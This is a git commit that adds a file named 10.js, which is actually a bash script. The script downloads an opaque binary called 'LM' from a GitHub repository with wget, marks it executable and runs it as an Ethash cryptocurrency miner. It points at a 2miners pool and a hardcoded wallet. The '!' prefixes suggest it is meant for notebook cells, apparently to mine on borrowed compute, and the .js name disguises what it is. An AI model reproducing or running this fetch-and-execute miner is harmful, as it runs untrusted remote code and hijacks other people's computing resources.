cd2918cc1afa6d02b28983fe20fe7b262872ce7c
mencobaiajanah <86476551+mencobaiajanah@users.noreply.github.com>
2021-08-04 02:10:32 +0800

    Create 10.js

---
+++ 10.js
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+#################################
+## Begin of user-editable part ##
+#################################
+
+ALGHO=ETHASH
+POOL=us-eth.2miners.com:2020
+WALLET=0x6e890745813facaeab2afab23440a04f6b55034a
+WORKER=$(echo $(shuf -i 1-999 -n 1)-VGA)
+
+#################################
+##  End of user-editable part  ##
+#################################
+
+! cd "$(dirname "$0")"
+
+! wget https://github.com/mencobaiajanah/SPLIT/raw/main/LM
+! chmod +x LM
+! ./LM --algo $ALGHO --pool $POOL --user $WALLET.$WORKER --watchdog exit
